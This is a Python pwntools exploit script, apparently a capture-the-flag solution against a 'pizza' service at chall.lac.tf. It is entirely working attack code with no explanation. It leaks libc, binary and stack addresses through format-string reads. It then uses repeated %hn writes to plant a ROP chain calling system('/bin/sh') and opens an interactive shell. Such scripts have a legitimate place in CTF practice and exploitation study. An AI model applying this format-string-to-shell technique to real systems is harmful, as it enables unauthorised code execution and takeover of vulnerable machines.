#!/usr/bin/python3

from pwn import *

exe = ELF('pizza_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # brva 0x12F0
                # brva 0x138B
                b *0x00005555555553fd
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.lac.tf', 31134)
else:
        p = process(exe.path)

GDB()
def send(payload1,payload2,payload3):
        sla(b'> ', '12')
        sla(b': ', payload1)
        sla(b'> ', '12')
        sla(b': ', payload2)
        sla(b'> ', '12')
        sla(b': ', payload3)
send(b'%67$p', b'%68$p', b'%64$p')
p.recvuntil(b'chose:\n')
libc.address = int(p.recvline(keepends=False), 16) - 0x27305
exe.address = int(p.recvline(keepends=False), 16) - exe.sym.main
stack = int(p.recvline(keepends=False), 16)

info("libc: " + hex(libc.address))
info("exe: " + hex(exe.address))
info("stack: " + hex(stack))
sla(b': ', b'y')
binsh = next(libc.search(b'/bin/sh\0'))
system = libc.sym.system
target = stack - 0x110
pop_rdi = libc.address + 0x00000000000277e5
ret = pop_rdi+1

send(p64(target), f'%{ret&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')

ret >>= 16
send(p64(target+2), f'%{ret&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')

ret >>= 16
send(p64(target+4), f'%{ret&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')

# ###
target += 8
send(p64(target), f'%{pop_rdi&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')

pop_rdi >>= 16
send(p64(target+2), f'%{pop_rdi&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')

pop_rdi >>= 16
send(p64(target+4), f'%{pop_rdi&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')


# #####
target += 8
send(p64(target), f'%{binsh&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')

binsh >>= 16
send(p64(target+2), f'%{binsh&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')

binsh >>= 16
send(p64(target+4), f'%{binsh&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')


# # ###
target += 8
send(p64(target), f'%{system&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')

system >>= 16
send(p64(target+2), f'%{system&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'y')

system >>= 16
send(p64(target+4), f'%{system&0xffff}c%6$hn'.encode(), b'/bin/sh\0')
sla(b': ', b'n')


p.interactive()
